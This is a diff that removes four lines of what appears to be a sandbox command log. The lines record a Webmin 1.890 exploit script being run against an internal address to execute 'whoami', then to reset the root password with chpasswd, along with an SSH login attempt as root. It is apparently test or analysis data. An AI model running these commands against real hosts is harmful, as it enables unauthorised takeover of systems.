@@ -1,4 +1,0 @@
-{"sandbox_id": "123", "timestamp_str": "2021-06-30T07:00:05.981Z", "cmd_type": "bash-command", "cmd": "python3 webmin-1.890_exploit.py 10.1.26.9 10000 'whoami'"}
-{"sandbox_id": "123", "timestamp_str": "2021-06-30T07:00:45.243Z", "cmd_type": "bash-command", "cmd": "python3 webmin-1.890_exploit.py 10.1.26.9 10000 'echo \"root:password\"| chpasswd'"}
-{"sandbox_id": "123", "timestamp_str": "2021-06-30T07:01:05.400Z", "cmd_type": "bash-command", "cmd": "ssh root@10.1.26.9"}
-{"sandbox_id": "123", "timestamp_str": "2021-06-30T07:01:09.615Z", "cmd_type": "bash-command", "cmd": "python3 webmin-1.890_exploit.py 10.1.26.9 10000 'echo \"root:password\" | chpasswd'"}
